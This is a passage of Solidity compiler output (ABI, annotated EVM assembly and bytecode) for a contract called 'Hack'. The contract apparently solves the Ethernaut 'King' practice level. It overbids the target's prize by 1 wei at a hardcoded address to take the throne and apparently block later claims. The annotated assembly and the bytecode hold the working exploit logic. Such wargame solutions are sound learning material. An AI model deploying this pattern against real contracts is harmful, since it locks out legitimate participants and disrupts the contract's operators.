{
	"security/etheranut/King/King.sol": {
		"Hack": {
			"abi": [
				{
					"inputs": [],
					"name": "becomeKing",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getKing",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getOwner",
					"outputs": [
						{
							"internalType": "address",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/King/King.sol\":567:1087  contract Hack {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/King/King.sol\":621:663  0x9bF9d8Dc0157AE86397961B879bd196217d8545f */\n  0x9bf9d8dc0157ae86397961b879bd196217d8545f\n    /* \"security/etheranut/King/King.sol\":588:664  address payable target = payable(0x9bF9d8Dc0157AE86397961B879bd196217d8545f) */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/King/King.sol\":688:694  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/King/King.sol\":671:695  King king = King(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/King/King.sol\":567:1087  contract Hack {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/King/King.sol\":567:1087  contract Hack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6708cc63\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x7920d804\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x893d20e8\n      eq\n      tag_4\n      jumpi\n    tag_1:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/King/King.sol\":797:988  function becomeKing()  public payable{... */\n    tag_2:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"security/etheranut/King/King.sol\":704:789  function getKing() public view returns(uint256){... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_7\n      jumpi\n      revert(0x00, 0x00)\n    tag_7:\n      pop\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/King/King.sol\":996:1082  function getOwner() public view returns(address){... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      revert(0x00, 0x00)\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/King/King.sol\":797:988  function becomeKing()  public payable{... */\n    tag_6:\n        /* \"security/etheranut/King/King.sol\":845:856  uint amount */\n      0x00\n        /* \"security/etheranut/King/King.sol\":859:868  getKing() */\n      tag_18\n        /* \"security/etheranut/King/King.sol\":859:866  getKing */\n      tag_9\n        /* \"security/etheranut/King/King.sol\":859:868  getKing() */\n      jump\t// in\n    tag_18:\n        /* \"security/etheranut/King/King.sol\":845:868  uint amount = getKing() */\n      swap1\n      pop\n        /* \"security/etheranut/King/King.sol\":880:892  bool success */\n      0x00\n        /* \"security/etheranut/King/King.sol\":897:903  target */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/King/King.sol\":897:908  target.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/King/King.sol\":923:928  1 wei */\n      0x01\n        /* \"security/etheranut/King/King.sol\":916:922  amount */\n      dup4\n        /* \"security/etheranut/King/King.sol\":916:928  amount+1 wei */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"security/etheranut/King/King.sol\":897:933  target.call{value: amount+1 wei}(\"\") */\n      mload(0x40)\n      tag_21\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup8\n      gas\n      call\n      swap3\n      pop\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_25\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_24)\n    tag_25:\n      0x60\n      swap2\n      pop\n    tag_24:\n      pop\n        /* \"security/etheranut/King/King.sol\":879:933  (bool success,) = target.call{value: amount+1 wei}(\"\") */\n      pop\n      swap1\n      pop\n        /* \"security/etheranut/King/King.sol\":952:959  success */\n      dup1\n        /* \"security/etheranut/King/King.sol\":944:980  require(success,\"transation failed\") */\n      tag_26\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_27\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_26:\n        /* \"security/etheranut/King/King.sol\":834:988  {... */\n      pop\n      pop\n        /* \"security/etheranut/King/King.sol\":797:988  function becomeKing()  public payable{... */\n      jump\t// out\n        /* \"security/etheranut/King/King.sol\":704:789  function getKing() public view returns(uint256){... */\n    tag_9:\n        /* \"security/etheranut/King/King.sol\":743:750  uint256 */\n      0x00\n        /* \"security/etheranut/King/King.sol\":769:773  king */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/King/King.sol\":769:779  king.prize */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe3ac5d26\n        /* \"security/etheranut/King/King.sol\":769:781  king.prize() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_32\n      swap2\n      swap1\n      tag_33\n      jump\t// in\n    tag_32:\n        /* \"security/etheranut/King/King.sol\":762:781  return king.prize() */\n      swap1\n      pop\n        /* \"security/etheranut/King/King.sol\":704:789  function getKing() public view returns(uint256){... */\n      swap1\n      jump\t// out\n        /* \"security/etheranut/King/King.sol\":996:1082  function getOwner() public view returns(address){... */\n    tag_14:\n        /* \"security/etheranut/King/King.sol\":1036:1043  address */\n      0x00\n        /* \"security/etheranut/King/King.sol\":1062:1066  king */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/King/King.sol\":1062:1072  king.owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8da5cb5b\n        /* \"security/etheranut/King/King.sol\":1062:1074  king.owner() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup7\n      gas\n      staticcall\n      iszero\n      dup1\n      iszero\n      tag_36\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_36:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      not(0x1f)\n      0x1f\n      dup3\n      add\n      and\n      dup3\n      add\n      dup1\n      0x40\n      mstore\n      pop\n      dup2\n      add\n      swap1\n      tag_37\n      swap2\n      swap1\n      tag_38\n      jump\t// in\n    tag_37:\n        /* \"security/etheranut/King/King.sol\":1055:1074  return king.owner() */\n      swap1\n      pop\n        /* \"security/etheranut/King/King.sol\":996:1082  function getOwner() public view returns(address){... */\n      swap1\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_39:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_40:\n        /* \"#utility.yul\":177:201   */\n      tag_61\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_39\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_11:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_63\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_40\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_41:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:670   */\n    tag_42:\n        /* \"#utility.yul\":611:618   */\n      0x00\n        /* \"#utility.yul\":640:664   */\n      tag_66\n        /* \"#utility.yul\":658:663   */\n      dup3\n        /* \"#utility.yul\":640:664   */\n      tag_41\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":629:664   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:670   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":676:794   */\n    tag_43:\n        /* \"#utility.yul\":763:787   */\n      tag_68\n        /* \"#utility.yul\":781:786   */\n      dup2\n        /* \"#utility.yul\":763:787   */\n      tag_42\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":758:761   */\n      dup3\n        /* \"#utility.yul\":751:788   */\n      mstore\n        /* \"#utility.yul\":676:794   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":800:1022   */\n    tag_16:\n        /* \"#utility.yul\":893:897   */\n      0x00\n        /* \"#utility.yul\":931:933   */\n      0x20\n        /* \"#utility.yul\":920:929   */\n      dup3\n        /* \"#utility.yul\":916:934   */\n      add\n        /* \"#utility.yul\":908:934   */\n      swap1\n      pop\n        /* \"#utility.yul\":944:1015   */\n      tag_70\n        /* \"#utility.yul\":1012:1013   */\n      0x00\n        /* \"#utility.yul\":1001:1010   */\n      dup4\n        /* \"#utility.yul\":997:1014   */\n      add\n        /* \"#utility.yul\":988:994   */\n      dup5\n        /* \"#utility.yul\":944:1015   */\n      tag_43\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":800:1022   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1028:1208   */\n    tag_44:\n        /* \"#utility.yul\":1076:1153   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1073:1074   */\n      0x00\n        /* \"#utility.yul\":1066:1154   */\n      mstore\n        /* \"#utility.yul\":1173:1177   */\n      0x11\n        /* \"#utility.yul\":1170:1171   */\n      0x04\n        /* \"#utility.yul\":1163:1178   */\n      mstore\n        /* \"#utility.yul\":1197:1201   */\n      0x24\n        /* \"#utility.yul\":1194:1195   */\n      0x00\n        /* \"#utility.yul\":1187:1202   */\n      revert\n        /* \"#utility.yul\":1214:1405   */\n    tag_20:\n        /* \"#utility.yul\":1254:1257   */\n      0x00\n        /* \"#utility.yul\":1273:1293   */\n      tag_73\n        /* \"#utility.yul\":1291:1292   */\n      dup3\n        /* \"#utility.yul\":1273:1293   */\n      tag_39\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1268:1293   */\n      swap2\n      pop\n        /* \"#utility.yul\":1307:1327   */\n      tag_74\n        /* \"#utility.yul\":1325:1326   */\n      dup4\n        /* \"#utility.yul\":1307:1327   */\n      tag_39\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":1302:1327   */\n      swap3\n      pop\n        /* \"#utility.yul\":1350:1351   */\n      dup3\n        /* \"#utility.yul\":1347:1348   */\n      dup3\n        /* \"#utility.yul\":1343:1352   */\n      add\n        /* \"#utility.yul\":1336:1352   */\n      swap1\n      pop\n        /* \"#utility.yul\":1371:1374   */\n      dup1\n        /* \"#utility.yul\":1368:1369   */\n      dup3\n        /* \"#utility.yul\":1365:1375   */\n      gt\n        /* \"#utility.yul\":1362:1398   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":1378:1396   */\n      tag_76\n      tag_44\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1362:1398   */\n    tag_75:\n        /* \"#utility.yul\":1214:1405   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1411:1558   */\n    tag_45:\n        /* \"#utility.yul\":1512:1523   */\n      0x00\n        /* \"#utility.yul\":1549:1552   */\n      dup2\n        /* \"#utility.yul\":1534:1552   */\n      swap1\n      pop\n        /* \"#utility.yul\":1411:1558   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1564:1678   */\n    tag_46:\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1684:2082   */\n    tag_47:\n        /* \"#utility.yul\":1843:1846   */\n      0x00\n        /* \"#utility.yul\":1864:1947   */\n      tag_80\n        /* \"#utility.yul\":1945:1946   */\n      0x00\n        /* \"#utility.yul\":1940:1943   */\n      dup4\n        /* \"#utility.yul\":1864:1947   */\n      tag_45\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":1857:1947   */\n      swap2\n      pop\n        /* \"#utility.yul\":1956:2049   */\n      tag_81\n        /* \"#utility.yul\":2045:2048   */\n      dup3\n        /* \"#utility.yul\":1956:2049   */\n      tag_46\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":2074:2075   */\n      0x00\n        /* \"#utility.yul\":2069:2072   */\n      dup3\n        /* \"#utility.yul\":2065:2076   */\n      add\n        /* \"#utility.yul\":2058:2076   */\n      swap1\n      pop\n        /* \"#utility.yul\":1684:2082   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2088:2467   */\n    tag_22:\n        /* \"#utility.yul\":2272:2275   */\n      0x00\n        /* \"#utility.yul\":2294:2441   */\n      tag_83\n        /* \"#utility.yul\":2437:2440   */\n      dup3\n        /* \"#utility.yul\":2294:2441   */\n      tag_47\n      jump\t// in\n    tag_83:\n        /* \"#utility.yul\":2287:2441   */\n      swap2\n      pop\n        /* \"#utility.yul\":2458:2461   */\n      dup2\n        /* \"#utility.yul\":2451:2461   */\n      swap1\n      pop\n        /* \"#utility.yul\":2088:2467   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2473:2642   */\n    tag_48:\n        /* \"#utility.yul\":2557:2568   */\n      0x00\n        /* \"#utility.yul\":2591:2597   */\n      dup3\n        /* \"#utility.yul\":2586:2589   */\n      dup3\n        /* \"#utility.yul\":2579:2598   */\n      mstore\n        /* \"#utility.yul\":2631:2635   */\n      0x20\n        /* \"#utility.yul\":2626:2629   */\n      dup3\n        /* \"#utility.yul\":2622:2636   */\n      add\n        /* \"#utility.yul\":2607:2636   */\n      swap1\n      pop\n        /* \"#utility.yul\":2473:2642   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2648:2815   */\n    tag_49:\n        /* \"#utility.yul\":2788:2807   */\n      0x7472616e736174696f6e206661696c6564000000000000000000000000000000\n        /* \"#utility.yul\":2784:2785   */\n      0x00\n        /* \"#utility.yul\":2776:2782   */\n      dup3\n        /* \"#utility.yul\":2772:2786   */\n      add\n        /* \"#utility.yul\":2765:2808   */\n      mstore\n        /* \"#utility.yul\":2648:2815   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2821:3187   */\n    tag_50:\n        /* \"#utility.yul\":2963:2966   */\n      0x00\n        /* \"#utility.yul\":2984:3051   */\n      tag_87\n        /* \"#utility.yul\":3048:3050   */\n      0x11\n        /* \"#utility.yul\":3043:3046   */\n      dup4\n        /* \"#utility.yul\":2984:3051   */\n      tag_48\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":2977:3051   */\n      swap2\n      pop\n        /* \"#utility.yul\":3060:3153   */\n      tag_88\n        /* \"#utility.yul\":3149:3152   */\n      dup3\n        /* \"#utility.yul\":3060:3153   */\n      tag_49\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":3178:3180   */\n      0x20\n        /* \"#utility.yul\":3173:3176   */\n      dup3\n        /* \"#utility.yul\":3169:3181   */\n      add\n        /* \"#utility.yul\":3162:3181   */\n      swap1\n      pop\n        /* \"#utility.yul\":2821:3187   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3193:3612   */\n    tag_28:\n        /* \"#utility.yul\":3359:3363   */\n      0x00\n        /* \"#utility.yul\":3397:3399   */\n      0x20\n        /* \"#utility.yul\":3386:3395   */\n      dup3\n        /* \"#utility.yul\":3382:3400   */\n      add\n        /* \"#utility.yul\":3374:3400   */\n      swap1\n      pop\n        /* \"#utility.yul\":3446:3455   */\n      dup2\n        /* \"#utility.yul\":3440:3444   */\n      dup2\n        /* \"#utility.yul\":3436:3456   */\n      sub\n        /* \"#utility.yul\":3432:3433   */\n      0x00\n        /* \"#utility.yul\":3421:3430   */\n      dup4\n        /* \"#utility.yul\":3417:3434   */\n      add\n        /* \"#utility.yul\":3410:3457   */\n      mstore\n        /* \"#utility.yul\":3474:3605   */\n      tag_90\n        /* \"#utility.yul\":3600:3604   */\n      dup2\n        /* \"#utility.yul\":3474:3605   */\n      tag_50\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":3466:3605   */\n      swap1\n      pop\n        /* \"#utility.yul\":3193:3612   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3699:3816   */\n    tag_52:\n        /* \"#utility.yul\":3808:3809   */\n      0x00\n        /* \"#utility.yul\":3805:3806   */\n      0x00\n        /* \"#utility.yul\":3798:3810   */\n      revert\n        /* \"#utility.yul\":3945:4067   */\n    tag_54:\n        /* \"#utility.yul\":4018:4042   */\n      tag_95\n        /* \"#utility.yul\":4036:4041   */\n      dup2\n        /* \"#utility.yul\":4018:4042   */\n      tag_39\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":4011:4016   */\n      dup2\n        /* \"#utility.yul\":4008:4043   */\n      eq\n        /* \"#utility.yul\":3998:4061   */\n      tag_96\n      jumpi\n        /* \"#utility.yul\":4057:4058   */\n      0x00\n        /* \"#utility.yul\":4054:4055   */\n      0x00\n        /* \"#utility.yul\":4047:4059   */\n      revert\n        /* \"#utility.yul\":3998:4061   */\n    tag_96:\n        /* \"#utility.yul\":3945:4067   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4073:4216   */\n    tag_55:\n        /* \"#utility.yul\":4130:4135   */\n      0x00\n        /* \"#utility.yul\":4161:4167   */\n      dup2\n        /* \"#utility.yul\":4155:4168   */\n      mload\n        /* \"#utility.yul\":4146:4168   */\n      swap1\n      pop\n        /* \"#utility.yul\":4177:4210   */\n      tag_98\n        /* \"#utility.yul\":4204:4209   */\n      dup2\n        /* \"#utility.yul\":4177:4210   */\n      tag_54\n      jump\t// in\n    tag_98:\n        /* \"#utility.yul\":4073:4216   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4222:4573   */\n    tag_33:\n        /* \"#utility.yul\":4292:4298   */\n      0x00\n        /* \"#utility.yul\":4341:4343   */\n      0x20\n        /* \"#utility.yul\":4329:4338   */\n      dup3\n        /* \"#utility.yul\":4320:4327   */\n      dup5\n        /* \"#utility.yul\":4316:4339   */\n      sub\n        /* \"#utility.yul\":4312:4344   */\n      slt\n        /* \"#utility.yul\":4309:4428   */\n      iszero\n      tag_100\n      jumpi\n        /* \"#utility.yul\":4347:4426   */\n      tag_101\n      tag_52\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":4309:4428   */\n    tag_100:\n        /* \"#utility.yul\":4467:4468   */\n      0x00\n        /* \"#utility.yul\":4492:4556   */\n      tag_102\n        /* \"#utility.yul\":4548:4555   */\n      dup5\n        /* \"#utility.yul\":4539:4545   */\n      dup3\n        /* \"#utility.yul\":4528:4537   */\n      dup6\n        /* \"#utility.yul\":4524:4546   */\n      add\n        /* \"#utility.yul\":4492:4556   */\n      tag_55\n      jump\t// in\n    tag_102:\n        /* \"#utility.yul\":4482:4556   */\n      swap2\n      pop\n        /* \"#utility.yul\":4438:4566   */\n      pop\n        /* \"#utility.yul\":4222:4573   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4579:4701   */\n    tag_56:\n        /* \"#utility.yul\":4652:4676   */\n      tag_104\n        /* \"#utility.yul\":4670:4675   */\n      dup2\n        /* \"#utility.yul\":4652:4676   */\n      tag_42\n      jump\t// in\n    tag_104:\n        /* \"#utility.yul\":4645:4650   */\n      dup2\n        /* \"#utility.yul\":4642:4677   */\n      eq\n        /* \"#utility.yul\":4632:4695   */\n      tag_105\n      jumpi\n        /* \"#utility.yul\":4691:4692   */\n      0x00\n        /* \"#utility.yul\":4688:4689   */\n      0x00\n        /* \"#utility.yul\":4681:4693   */\n      revert\n        /* \"#utility.yul\":4632:4695   */\n    tag_105:\n        /* \"#utility.yul\":4579:4701   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4707:4850   */\n    tag_57:\n        /* \"#utility.yul\":4764:4769   */\n      0x00\n        /* \"#utility.yul\":4795:4801   */\n      dup2\n        /* \"#utility.yul\":4789:4802   */\n      mload\n        /* \"#utility.yul\":4780:4802   */\n      swap1\n      pop\n        /* \"#utility.yul\":4811:4844   */\n      tag_107\n        /* \"#utility.yul\":4838:4843   */\n      dup2\n        /* \"#utility.yul\":4811:4844   */\n      tag_56\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":4707:4850   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4856:5207   */\n    tag_38:\n        /* \"#utility.yul\":4926:4932   */\n      0x00\n        /* \"#utility.yul\":4975:4977   */\n      0x20\n        /* \"#utility.yul\":4963:4972   */\n      dup3\n        /* \"#utility.yul\":4954:4961   */\n      dup5\n        /* \"#utility.yul\":4950:4973   */\n      sub\n        /* \"#utility.yul\":4946:4978   */\n      slt\n        /* \"#utility.yul\":4943:5062   */\n      iszero\n      tag_109\n      jumpi\n        /* \"#utility.yul\":4981:5060   */\n      tag_110\n      tag_52\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":4943:5062   */\n    tag_109:\n        /* \"#utility.yul\":5101:5102   */\n      0x00\n        /* \"#utility.yul\":5126:5190   */\n      tag_111\n        /* \"#utility.yul\":5182:5189   */\n      dup5\n        /* \"#utility.yul\":5173:5179   */\n      dup3\n        /* \"#utility.yul\":5162:5171   */\n      dup6\n        /* \"#utility.yul\":5158:5180   */\n      add\n        /* \"#utility.yul\":5126:5190   */\n      tag_57\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":5116:5190   */\n      swap2\n      pop\n        /* \"#utility.yul\":5072:5200   */\n      pop\n        /* \"#utility.yul\":4856:5207   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220c67d43881a4bbed1d6eb3d696d2b874a5af6c9896fb2dc1bd20100062560329164736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "6080604052739bf9d8dc0157ae86397961b879bd196217d8545f5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801560c1575f5ffd5b50610526806100cf5f395ff3fe608060405260043610610033575f3560e01c80636708cc63146100375780637920d80414610041578063893d20e81461006b575b5f5ffd5b61003f610095565b005b34801561004c575f5ffd5b50610055610178565b60405161006291906102b8565b60405180910390f35b348015610076575f5ffd5b5061007f61020c565b60405161008c9190610310565b60405180910390f35b5f61009e610178565b90505f5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001836100e59190610356565b6040516100f1906103b6565b5f6040518083038185875af1925050503d805f811461012b576040519150601f19603f3d011682016040523d82523d5f602084013e610130565b606091505b5050905080610174576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161016b90610424565b60405180910390fd5b5050565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e3ac5d266040518163ffffffff1660e01b8152600401602060405180830381865afa1580156101e3573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102079190610470565b905090565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638da5cb5b6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610277573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061029b91906104c5565b905090565b5f819050919050565b6102b2816102a0565b82525050565b5f6020820190506102cb5f8301846102a9565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6102fa826102d1565b9050919050565b61030a816102f0565b82525050565b5f6020820190506103235f830184610301565b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f610360826102a0565b915061036b836102a0565b925082820190508082111561038357610382610329565b5b92915050565b5f81905092915050565b50565b5f6103a15f83610389565b91506103ac82610393565b5f82019050919050565b5f6103c082610396565b9150819050919050565b5f82825260208201905092915050565b7f7472616e736174696f6e206661696c65640000000000000000000000000000005f82015250565b5f61040e6011836103ca565b9150610419826103da565b602082019050919050565b5f6020820190508181035f83015261043b81610402565b9050919050565b5f5ffd5b61044f816102a0565b8114610459575f5ffd5b50565b5f8151905061046a81610446565b92915050565b5f6020828403121561048557610484610442565b5b5f6104928482850161045c565b91505092915050565b6104a4816102f0565b81146104ae575f5ffd5b50565b5f815190506104bf8161049b565b92915050565b5f602082840312156104da576104d9610442565b5b5f6104e7848285016104b1565b9150509291505056fea2646970667358221220c67d43881a4bbed1d6eb3d696d2b874a5af6c9896fb2dc1bd20100062560329164736f6c634300081e0033",
